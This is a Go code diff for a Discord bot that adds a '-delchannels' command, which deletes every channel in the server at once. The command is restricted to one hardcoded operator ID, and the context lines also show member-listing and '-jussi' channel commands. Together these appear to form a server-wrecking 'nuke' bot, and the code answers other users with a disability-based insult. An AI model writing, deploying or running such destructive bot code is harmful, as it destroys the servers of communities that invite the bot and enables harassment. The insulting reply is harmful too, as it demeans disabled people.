@@ -112,6 +112,25 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		return
 	}
 
+	if m.Content == "-delchannels" {
+		if m.Author.ID != "890320508984377354" {
+			s.ChannelMessageSend(m.ChannelID, "are you autistic?")
+			return
+		}
+
+		channels, err := s.GuildChannels(m.GuildID)
+
+		if err != nil {
+			fmt.Println("error fetching guild channels for " + m.GuildID)
+			return
+		}
+
+		for _, channel := range channels {
+			go s.ChannelDelete(channel.ID)
+		}
+
+	}
+
 	if m.Content == "-members" {
 		members, err := s.GuildMembers(m.GuildID, "", 1000)
 
@@ -142,6 +161,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if m.Content == "-jussi" {
 		if m.Author.ID != "890320508984377354" {
 			s.ChannelMessageSend(m.ChannelID, "are you autistic?")
+			return
 		}
 
 		createChnlMsgs(m.GuildID, s)
